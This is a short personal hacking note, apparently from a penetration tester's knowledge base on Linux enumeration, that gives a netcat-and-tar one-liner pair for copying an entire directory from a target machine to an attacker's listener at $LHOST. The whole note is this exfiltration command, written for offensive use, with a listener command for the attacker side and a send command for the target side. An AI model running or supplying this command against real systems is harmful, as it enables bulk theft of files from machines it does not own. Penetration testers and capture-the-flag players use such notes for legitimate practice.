# linux enumeration quick commands copy entire directory to attacker machine quickly by piping tar
attacker
```bash
# attacker
nc -lvnp 1337 | tar -xf -
# target
tar -cf - . | nc $LHOST 1337
```

# References
- [20221003150920](/zet/20221003150920/README.md) linux enumeration quick commands
- ~/kb/hacking/priv-esc/enumeration-quick-commands.md

Tags:
    #assorted #command
